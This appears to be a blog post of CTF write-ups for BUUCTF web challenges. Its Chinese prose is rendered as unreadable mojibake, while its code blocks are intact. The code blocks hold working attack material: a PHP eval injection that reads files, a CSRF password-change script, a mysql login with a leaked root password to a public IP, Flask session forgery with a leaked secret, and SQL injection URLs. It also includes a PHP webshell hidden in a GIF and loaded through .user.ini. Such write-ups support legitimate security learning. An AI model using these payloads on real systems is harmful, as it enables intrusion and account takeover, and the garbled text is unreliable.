<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ç­”ï¼š PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1.åˆ é™¤ç©ºç™½ç¬¦ 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘</p>
<p>èŠ‚é€‰è‡ªï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>
</blockquote>
<p>â€‹    è¿™é‡Œè‡ªå·±èœäº†ï¼Œevalæœ¬èº«å°±æ˜¯æ‰§è¡Œphpä»£ç ï¼Œecho phpinfo();æœ¬èº«å°±æ˜¯echoå‡ºphpinfo()çš„ä»£ç ç»“æœï¼Œæ‰€ä»¥è‡ªå·±ç”šè‡³å¤ç°ç¯å¢ƒå»è¯•éªŒäº†åŠå¤©ã€‚å¦å¤–æºç ä¸­åªæ˜¾ç¤ºäº†éƒ¨åˆ†è¿‡æ»¤çš„å­—ç¬¦ï¼Œå…¶ä¸­åŸé¢˜ä¸­è¿˜æœ‰WAFã€‚</p>
<p>â€‹    è¿™é‡Œçš„ä¸»è¦ç»•è¿‡æ–¹å¼æ˜¯PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§æ¼æ´ï¼Œnumå˜é‡å‰åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œè®©<strong>wafè®¤ä¸ºæ˜¯â€™ numâ€™å˜é‡è€Œç»•è¿‡è¿‡æ»¤</strong>ï¼Œä½†<strong>PHPä¼šè‡ªåŠ¨å»é™¤ç©ºæ ¼å¾—åˆ°numå˜é‡ä»è€Œç»•è¿‡WAF</strong>ã€‚æ„é€ <code> num=phpinfo();</code>æˆåŠŸæ‰§è¡Œphpinfoï¼ŒæŸ¥çœ‹ä¸€ä¸‹disable_functionsï¼Œç¦ç”¨äº†éå¸¸å¤šçš„å‡½æ•°ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BYC8Xj"><img src="https://s1.ax1x.com/2020/10/29/BYC8Xj.png" alt="BYC8Xj.png"></a></p>
<p>â€‹    è¿™é‡Œä½¿ç”¨<code>scandir()</code>å‡½æ•°è¯»å–æŸç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œè¿”å›æ•°ç»„å¯¹è±¡ã€‚</p>
<p>â€‹    Payloadï¼šï¼ˆ<strong>é‡ç‚¹ï¼š</strong>scandirè¿”å›å€¼æ˜¯ä¸€ä¸ª<strong>æ•°ç»„å¯¹è±¡</strong>ï¼Œå› æ­¤éœ€è¦ç”¨var_dumpæ‰èƒ½æ˜¾ç¤ºå†…å®¹ï¼‰ï¼Œå¦å¤–â€™/â€˜åœ¨æºç ä¸­è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨chr()æ¥ç»•è¿‡ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://node3.buuoj.cn:27536/calc.php?num=var_dump(scandir(chr(47)));</span><br><span class="line"></span><br><span class="line">array(24) &#123; [0]=&gt; string(1) <span class="string">&quot;.&quot;</span> [1]=&gt; string(2) <span class="string">&quot;..&quot;</span> [2]=&gt; string(10) <span class="string">&quot;.dockerenv&quot;</span> [3]=&gt; string(3) <span class="string">&quot;bin&quot;</span> [4]=&gt; string(4) <span class="string">&quot;boot&quot;</span> [5]=&gt; string(3) <span class="string">&quot;dev&quot;</span> [6]=&gt; string(3) <span class="string">&quot;etc&quot;</span> [7]=&gt; string(5) <span class="string">&quot;f1agg&quot;</span> [8]=&gt; string(4) <span class="string">&quot;home&quot;</span> [9]=&gt; string(3) <span class="string">&quot;lib&quot;</span> [10]=&gt; string(5) <span class="string">&quot;lib64&quot;</span> [11]=&gt; string(5) <span class="string">&quot;media&quot;</span> [12]=&gt; string(3) <span class="string">&quot;mnt&quot;</span> [13]=&gt; string(3) <span class="string">&quot;opt&quot;</span> [14]=&gt; string(4) <span class="string">&quot;proc&quot;</span> [15]=&gt; string(4) <span class="string">&quot;root&quot;</span> [16]=&gt; string(3) <span class="string">&quot;run&quot;</span> [17]=&gt; string(4) <span class="string">&quot;sbin&quot;</span> [18]=&gt; string(3) <span class="string">&quot;srv&quot;</span> [19]=&gt; string(8) <span class="string">&quot;start.sh&quot;</span> [20]=&gt; string(3) <span class="string">&quot;sys&quot;</span> [21]=&gt; string(3) <span class="string">&quot;tmp&quot;</span> [22]=&gt; string(3) <span class="string">&quot;usr&quot;</span> [23]=&gt; string(3) <span class="string">&quot;var&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    chrç»•è¿‡è¿‡æ»¤ï¼ˆ<strong>é”™è¯¯ç‚¹ï¼š</strong>chr()æœ¬èº«å°±æ˜¯å­—ç¬¦ç±»å‹ï¼Œä½¿ç”¨<code>.</code>æ‹¼æ¥å³æ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ— é¡»æ‹¼æ¥<code>&quot;æˆ–&#39;</code>ï¼‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:27536/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span></span><br><span class="line"></span><br><span class="line">Flagï¼šflag&#123;bf14d19d-dfef<span class="number">-473</span>c-ba1a-f0a90500f7cc&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åã€-HCTF-2018-admin"><a href="#åã€-HCTF-2018-admin" class="headerlink" title="åã€[HCTF 2018]admin"></a>åã€[HCTF 2018]admin</h3><p>â€‹    è¿™é“é¢˜æœ‰ç‚¹æ„æ€ï¼Œæœ‰æ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹å¯†ç ã€æŠ¥å‘Šå››ä¸ªé€»è¾‘ã€‚åŸºäºå¯¹å‰é¢XSSå’ŒCSRFç±»å‹é¢˜æ²¡æœ‰æˆåŠŸåšå‡ºæ¥è¿‡ï¼Œæœ¬èƒ½çš„ä»¥ä¸ºè¿™æ˜¯ä¸€é“XSS+CSRFçš„é¢˜ã€‚ä½†æ„é€ åŠå¤©Payloadï¼Œæ²¡åŠç‚¹ç”¨ã€‚ä¸Šç½‘ç®€å•æœç´¢ä¸€ä¸‹ï¼Œçœ‹åˆ°äº†ä¸€ç‚¹hintï¼Œä¿®æ”¹å¯†ç é¡µé¢çš„æºç æœ‰ä¸€ä¸ªgithubåœ°å€ã€‚è¿™é¢˜çš„è¿·æƒ‘æ€§çœŸå¼ºï¼ŒçœŸå‘ã€‚</p>
<p>â€‹    å°½ç®¡æ²¡æˆåŠŸPayloadä¾ç„¶ç•™ä¸€ä¸‹ï¼Œä»¥åæˆ–è®¸ä¼šç”¨åˆ°ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> Ajax=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> sendurl = <span class="string">&quot;http://f1212200-df54-4e57-b763-f3f482413e7a.node3.buuoj.cn/change&quot;</span>;</span><br><span class="line">    Ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    Ajax.open(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">false</span>);    <span class="comment">//trueè¡¨ç¤ºå¼‚æ­¥</span></span><br><span class="line">    Ajax.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    content=<span class="string">&quot;newpassword=123456&quot;</span>;</span><br><span class="line">    Ajax.setRequestHeader(<span class="string">&quot;Host&quot;</span>,<span class="string">&quot;f1212200-df54-4e57-b763-f3f482413e7a.node3.buuoj.cn&quot;</span>);</span><br><span class="line">        Ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">      Ajax.send(content);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>â€‹    ä¸‹è½½Githubæºç ï¼Œç®€å•åˆ†ææ˜¯ä¸€ä¸ªç®€å•çš„python flaskåç«¯ï¼Œæºç æ³„éœ²äº†mysqlçš„é…ç½®ï¼Œæ‰€ä»¥å…ˆå°è¯•äº†ä¸€ä¸‹è¿œç¨‹è¿æ¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -padsl1234 -h 111.73.46.229</span><br></pre></td></tr></table></figure>

<p>â€‹    æ²¡æœ‰æˆåŠŸè¿æ¥ï¼Œå¦å¤–åœ¨config.pyä¸­å‘ç°äº†flask Sessionçš„å¯†é’¥â€™ckj123â€™ã€‚è¿™é‡Œæƒ³åˆ°å¯èƒ½æ˜¯ä¼ªé€ adminç”¨æˆ·ç™»å½•å§ã€‚æ‰€ä»¥è¿™é‡Œå…ˆæ‹¿å‡ºGEEKæ–°ç”Ÿèµ›ç”¨è¿‡çš„flask-unsignè„šæœ¬å…ˆè¿›è¡ŒSessionå†…å®¹çš„è§£æã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie <span class="string">&#x27;.eJw9kEFrwkAQhf9KmbMHs5KL4MGSuBiYCYZNl5mLtGtM3DQWotK44n_v4qH39z6-9x6wP47NpYPldbw1M9ifDrB8wNsXLKG02xS9C2x3oTRrJRrvGD58aeuF6MrTkE9o618KbkGZm1DxVJrCc2hT1MWA4dCT2U6sdgmaamDPizLLU_FtSko60bmirOslcwF1PZW6Vqjkm8w6EdPexbzHTn4n4xIydOJQnSgUnWR1gnrTYfRhU8R8u4LnDNxlPO6vP31z_p_AZuPZ0sAhj8h-Lh6D2F3CQ1SyHFU4kBcvRqJG1WHGStarF-78OTQREbyDGdwuzfj6BpI5PP8A-gBk-g.X6EdLA.CyPuxh1U262hdRQNM16v_abocRQ&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ByafG6"><img src="https://s1.ax1x.com/2020/11/03/ByafG6.png" alt="ByafG6.png"></a></p>
<p>â€‹    ç„¶åå°†nameä¸­çš„zjcæ”¹ä¸ºadminä½¿ç”¨æ³„éœ²çš„å¯†é’¥è¿›è¡ŒSessionä¼ªé€ </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;9b9273ad3906dc235c9e7ddc6a11e07774713f192cc890bf37d521cd514fb67819f897fada648dd730e18e63fe505e82e0fb1257553bc4b72ad550aa0c2a2e58&#x27;, &#x27;csrf_token&#x27;: b&#x27;a1cacfc15e94f33ed5bd51f9f6366ce6dd4a066d&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span> --secret <span class="string">&#x27;ckj123&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°ä¼ªé€ Session</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kMGKwjAURX9lyNqFjXQjuOjQGiy8VyzphPc2orW2TScOtMrUiP8-wcXs7z2ce5_icBmbqRPr23hvFuLQn8X6KT5OYi0Ks4vB1p7M3hc6kazgAf7LFqZasSotumwGU_2ir1eY1jNImgudW_JtDCp34M8D6t1Mch-BLh1ZWhVpFrNtY5Tcscokpt3Aae1BVXOhKgmSv1EnEev2wfozdLIH6jpCjT35skefd5xWEahtB8GHdB7y7Ua8FqKexsvh9jM01_8JpLeWDDryWUAOS7bg2ewjckHJUFAhj5Ytaw4aZQcpSU42b9z16JqAOJ5dfxULcZ-a8f2OiJbi9QfH_GW8.X6Ed-g.tFhNZVqKZhSxPE_IyS0bNicF44s</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ByabdA"><img src="https://s1.ax1x.com/2020/11/03/ByabdA.png" alt="ByabdA.png"></a></p>
<p>æµè§ˆå™¨ä¸­Cookieå¡«ä¸€ä¸‹å³å¯ã€‚ç™»é™†åå¾—åˆ°flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b45f2c42<span class="number">-9</span>be8<span class="number">-46</span>a5<span class="number">-9</span>a24-d622bbccad79&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27%20oorr%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%23&amp;password=123 </span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~geek~&#x27;</span></span><br><span class="line"></span><br><span class="line">/check.php?username=admin%27%20oorr%20updatexml(1,concat(0x7e,(selselectect%20group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=database()),<span class="string">&#x27;^&#x27;</span>),1)%23&amp;password=123 </span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~b4bsql,geekuser^&#x27;</span></span><br><span class="line"></span><br><span class="line">/check.php?username=admin%27%20oorr%20updatexml(1,concat(0x7e,(selselectect%20susubstrbstr(group_concat(column_name),1,20)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=<span class="string">&#x27;b4bsql&#x27;</span>),<span class="string">&#x27;^&#x27;</span>),1)%23&amp;password=123</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,username,password^&#x27;</span>    <span class="comment">#ä¸¤ä¸ªè¡¨éƒ½æ˜¯ä¸‰ä¸ªå­—æ®µ</span></span><br><span class="line"></span><br><span class="line">/check.php?username=adminsh%27%20oorr%20updatexml(1,concat(0x7e,(selselectect%20susubstrbstr(group_concat(passwoorrd),155,30)%20frfromom%20b4bsql),<span class="string">&#x27;^&#x27;</span>),1)%23&amp;password=123</span><br><span class="line">flag&#123;8aeb63ef-2526-47f4-ad14-de209366f473&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ï¼šorã€selectã€whereã€fromã€substrï¼ŒåŒå†™ç»•è¿‡ï¼Œæœ¬è´¨å°±æ˜¯å…³é”®å­—æ›¿æ¢ç©ºæ ¼</p>
<h3 id="åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h3><p>â€‹    1ã€æ­¤é¢˜é»‘åå•è¿‡æ»¤ï¼Œå¯phtml</p>
<p>â€‹    2ã€æ­¤é¢˜æ£€æµ‹å›¾ç‰‡å†…å®¹ï¼ŒGIFå¤´</p>
<p>â€‹    3ã€æ­¤é¢˜æ£€æµ‹å†…å®¹æ˜¯å¦æœ‰PHPæ ‡ç­¾&lt;?ï¼Œä½¿ç”¨jsä»£æ›¿PHPè„šæœ¬ï¼Œå­¦ä¹ äº†ã€‚ï¼ˆ<strong>æ³¨ï¼šPHP7ä»¥åä¸å†æ”¯æŒè¯¥æ–¹æ³•</strong>ï¼‰</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;zjc&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">55</span>ed55f0<span class="number">-539</span>a<span class="number">-44</span>a9<span class="number">-926</span>b-ddcf182ed69e&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åä¸‰ã€-SUCTF-2019-CheckIn"><a href="#åä¸‰ã€-SUCTF-2019-CheckIn" class="headerlink" title="åä¸‰ã€[SUCTF 2019]CheckIn"></a>åä¸‰ã€[SUCTF 2019]CheckIn</h3><p>â€‹    æ­¤é¢˜ä¸Šä¼ æ¼æ´æ–°å§¿åŠ¿ï¼Œå‰é¢˜æ˜¯éœ€è¦ä¸Šä¼ ç›®å½•ä¸­æœ‰phpæ–‡ä»¶ã€‚é…åˆä¸Šä¼ **.user.ini<strong>æ¥å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„æ•ˆæœã€‚</strong>.user.ini**ç±»ä¼¼äº.htaccessï¼Œæ˜¯phpçš„å­ç›®å½•ä¸­çš„é…ç½®æ–‡ä»¶ã€‚</p>
<blockquote>
<p>è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ INI æ–‡ä»¶é…ç½®ã€‚æ­¤ç±»æ–‡ä»¶ <em>ä»…</em>è¢« CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½ çš„ PHP ä»¥æ¨¡å—åŒ–è¿è¡Œåœ¨ Apache é‡Œï¼Œåˆ™ç”¨ .htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚</p>
</blockquote>
<p>â€‹    é…åˆphp.iniä¸­çš„æ–‡ä»¶åŒ…å«é…ç½®ç”¨ï¼Œauto_prepend_file ã€auto_append_fileã€‚æœ¬é¢˜ä¸­ä¸Šä¼ ç›®å½•æä¾›äº†ä¸€ä¸ªindex.phpï¼Œå› æ­¤æˆ‘ä»¬å†™å…¥ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œç„¶åå†™å…¥ä¸€ä¸ª.user.inié€šè¿‡auto_prepend_fileçš„é€‰é¡¹ä½¿è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰phpæ–‡ä»¶æ‰§è¡Œæ—¶åŒ…å«è¿™ä¸ªå›¾ç‰‡é©¬ã€‚</p>
<p>â€‹    <strong>æ³¨ï¼šè¿™é‡Œå…¶å®æƒ³è¿‡ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œä½†æ˜¯é¢˜ç›®æœ‰æ–‡ä»¶å†…å®¹æ˜¯å›¾ç‰‡çš„exif_iamgetypeå‡½æ•°è¦æ±‚ï¼Œ.htaccessä¸­å¦‚æœå‡ºç°æ— æ•ˆå­—ç¬¦åˆ™ç›´æ¥æ•´ä¸ªé…ç½®æ— æ•ˆã€‚.user.iniå°±æ²¡æœ‰è¿™ä¸ªæƒ…å†µå‘ç”Ÿï¼Œå³ä½¿ç¬¬ä¸€å¥GIF89æ˜¯æ— æ•ˆè¯­å¥ï¼Œä¹Ÿä¸å½±å“åé¢é…ç½®çš„è¿è¡Œã€‚</strong></p>
<p>â€‹    Payloadï¼š</p>
<p>.user.ini + JSå›¾ç‰‡é©¬jsxmgif.gif</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89</span><br><span class="line">auto_prepend_file=jsxmgif.gif</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?,? d23&lt;pre&gt;&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="string">&#x27;zjc&#x27;</span>]);&lt;/script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åï¼Œè®¿é—®ä¸Šä¼ ç›®å½•ä¸­çš„index.phpå³å¯è§¦å‘è¿™ä¸ªé…ç½®ã€‚get /flagå³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">8</span>d043cf7<span class="number">-7775</span><span class="number">-457e-8620</span>-d4c34c65dee0&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åå››ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#åå››ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="åå››ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>åå››ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h3><p>â€‹    1ã€çœ‹æç¤ºï¼Œè¦èº«ä»½æ˜¯å­¦æ ¡äººï¼Œé¦–å…ˆæƒ³åˆ°èº«ä»½ä¼ªé€ ï¼Œçœ‹Sessionï¼Œæ”¹1ã€‚</p>
<p>â€‹    2ã€å¾—èŠ±é’±ï¼Œpostä¼ moneyå’Œpasswordï¼Œpay.phpæºç ä¸­æç¤ºçš„ã€‚ä¼ å…¥money=10000000æ—¶ï¼Œæ˜¾ç¤ºè¿‡é•¿ï¼Œé‚£ä¹ˆå…¶å®ç§‘å­¦è®¡æ•°æ³•å°±å¯ä»¥ï¼Œæ¯”å¦‚ï¼š1.1e8ã€‚ï¼ˆå¿…é¡»æ¯”1e8å¤§æ‰èƒ½ä¹°ï¼Œè¿™é‡Œæˆ‘1e8æ²¡è¿‡ï¼Œè¿˜ä»¥ä¸ºæ˜¯sessionçˆ†ç ´â€¦ï¼‰</p>
<p><strong>æ¼æ´ç‚¹</strong></p>
<p>â€‹        1ã€PHP **is_numeric()**æ¼æ´ï¼šå¯ä»¥ä½¿ç”¨%20ã€%00ç»•è¿‡æ•°å­—æ£€æŸ¥ã€‚</p>
<p>â€‹        2ã€PHP **strcmp()**æ¼æ´ï¼šè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯money[]=10000000ï¼Œæ˜¯strcmp()å‡½æ•°çš„ç»•è¿‡æ–¹å¼ï¼Œåœ¨PHP5.3å‰strcmpåœ¨æ¯”è¾ƒéå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®æ—¶ï¼Œå°½ç®¡é”™è¯¯ï¼Œä½†ä»ç„¶ä¼šè¿”å›0ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">http://e8fa9c1f-c2cb-4f05-8cba-bc7dffd7fd00.node3.buuoj.cn/pay.php</span><br><span class="line"></span><br><span class="line">password=404aa&amp;money=1.1e8</span><br><span class="line"></span><br><span class="line">flag&#123;4ede3f36-28b3-4ce1-9b8f-c1cd6cc0bb9a&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åäº”ã€-BJDCTF2020-Easy-MD5"><a href="#åäº”ã€-BJDCTF2020-Easy-MD5" class="headerlink" title="åäº”ã€[BJDCTF2020]Easy MD5"></a>åäº”ã€[BJDCTF2020]Easy MD5</h3><p><strong>MD5è€ƒç‚¹ï¼š</strong></p>
<p>â€‹    0eç¢°æ’ï¼ˆå¼±ç±»å‹æ¯”è¾ƒï¼‰</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO  aabg7XSs SWAnXIiW8Ja4ZSScYOaW TvprPWh9i81i5cBtEkFG=</span><br></pre></td></tr></table></figure>

<p>â€‹    æ•°ç»„è¿”å›å€¼NULLæ’ç­‰æ¼æ´ï¼ˆå¼ºç±»å‹æ¯”è¾ƒï¼‰</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>

<p>â€‹    çœŸæ­£çš„MD5ç¢°æ’ï¼Œå€¼ä¸åŒï¼ŒMD5ç›¸åŒ</p>
<blockquote>
<p>å«æœ‰æ›´å¤šäºŒè¿›åˆ¶æ ·æœ¬ï¼ˆå›½äº§ï¼‰<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
<p>å¤–å›½çš„è®¨è®ºï¼š<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"><span class="comment">#æ³¨ï¼šæ— éœ€URLç¼–ç </span></span><br></pre></td></tr></table></figure>

<p>â€‹    Flagï¼š</p>
